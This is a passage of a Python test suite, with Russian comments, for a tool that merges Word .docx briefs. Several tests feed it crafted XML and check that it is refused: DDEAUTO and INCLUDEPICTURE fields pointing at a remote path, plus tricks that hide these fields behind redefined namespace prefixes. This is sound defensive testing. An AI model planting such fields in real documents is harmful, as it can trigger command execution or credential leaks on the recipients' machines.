                '<q:r><q:fldChar q:fldCharType="end"/></q:r></w:p>')
        self.refused("коды.docx", with_body("коды.docx", evil).read_bytes())
        # приставку «w» переобъявили на чужое пространство — разметка Word ушла бы мимо разбора
        evil = '<w:p xmlns:w="urn:x"><w:r><w:t>т</w:t></w:r></w:p>'
        self.refused("переобъявлен.docx", with_body("переобъявлен.docx", evil).read_bytes())

    def test_04_svyazi_pod_drugoy_pristavkoy(self):
        """Связи (картинки, ссылки) — только под «r:», иначе их не переименовать."""
        evil = ('<w:p xmlns:x="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
                '<w:hyperlink x:id="rId8"><w:r><w:t>ссылка</w:t></w:r></w:hyperlink></w:p>')
        self.refused("связи.docx", with_body("связи.docx", evil).read_bytes())

    def test_05_vtoraya_liniya(self):
        """Если опасное поле всё же дошло до готового текста — отказ разбором по адресам, не по приставкам."""
        root = (f'<w:document xmlns:w="{W}" xmlns:q="{W}">')
        for chunk in ('<w:p><q:r><q:instrText> INCLUDEPICTURE "\\\\h\\x" </q:instrText></q:r></w:p>',
                      f'<w:p><q:fldSimple q:instr=" DDEAUTO x "><q:r><q:t>т</q:t></q:r></q:fldSimple></w:p>'):
            with self.subTest(chunk=chunk[:40]):
                with self.assertRaises(bj.MergeError):
                    bj._check_xml(root, chunk, "x.docx")
        bj._check_xml(root, '<w:p><w:r><w:instrText> PAGEREF _Q1 \\h </w:instrText></w:r></w:p>', "x.docx")

    def test_06_obychnyy_brif_iz_worda_prohodit(self):
        """Обычный бриф из Word с полем PAGEREF и объявлениями w14/mc — объединяется."""
        ok = rewrite_docx(brief_file("удмуртия"), TMP / "обычный.docx", lambda f: f.update({
            "word/document.xml": f["word/document.xml"].decode().replace(
                "<w:sectPr", "<w:p>" + fld("PAGEREF _Toc1 \\h", "1") + "</w:p><w:sectPr", 1).encode()}))
        res = self.merge("обычный.docx", ok.read_bytes())
        self.assertEqual(len(res["questions"]), 2)
        self.assertIn("PAGEREF _Toc1", part(TMP / "ns.docx", "word/document.xml"))


@unittest.skipUnless(pages.mode() == "word" and sys.platform == "darwin" and shutil.which("pdftotext"),
                     "нужен Word на Mac и BRIEF_PAGES=word")
class TestRealWord(unittest.TestCase):
    """Сводный из трёх брифов разной длины: номера в оглавлении — как в PDF, сохранённом Word."""

    def test_01_nomera_sovpadayut_s_pdf(self):
        big = rewrite_docx(brief_file("свердловская"), TMP / "длинный.docx", lambda f: f.update({
            "word/document.xml": f["word/document.xml"].decode().replace(
                "<w:sectPr", "".join(f"<w:p><w:r><w:t>Дополнение {i}: " + "текст брифа " * 40 + "</w:t></w:r></w:p>"
                                     for i in range(40)) + "<w:sectPr", 1).encode()}))
        files = [("удмуртия.docx", brief_file("удмуртия").read_bytes()), ("длинный.docx", big.read_bytes()),
                 ("алтай.docx", brief_file("алтай").read_bytes())]
        bj.merge_files(files, TMP / "real.docx", title="Проверка номеров")
        pages.settle()
        nums = toc_numbers(part(TMP / "real.docx", "word/document.xml"))
        self.assertGreater(nums[2] - nums[1], nums[1] - nums[0])   # брифы разной длины
        box = Path.home() / "Library/Containers/com.microsoft.Word/Data/tmp"
        src = box / f"chk-{uuid.uuid4().hex[:8]}.docx"
        pdf = src.with_suffix(".pdf")
        shutil.copyfile(TMP / "real.docx", src)
        try:
            subprocess.run(["osascript", "-e", f'tell application "Microsoft Word"\nopen (POSIX file "{src}")\n'
                            f'set d to document "{src.name}"\nsave as d file name "{pdf}" file format format PDF\n'
                            "close d saving no\nend tell"], check=True, timeout=180)
            found, pg = {}, 1
            while True:
                t = subprocess.run(["pdftotext", "-f", str(pg), "-l", str(pg), str(pdf), "-"],
                                   capture_output=True, text=True)
                if t.returncode:
                    break
                for i in range(1, 4):
                    if i not in found and pg > 1 and re.search(rf"Вопрос\s+{i}\.\s", t.stdout):
                        found[i] = pg
                pg += 1
        finally:
            src.unlink(missing_ok=True)
            pdf.unlink(missing_ok=True)
        self.assertEqual([found.get(i) for i in (1, 2, 3)], nums)


if __name__ == "__main__":
    unittest.main(verbosity=2)
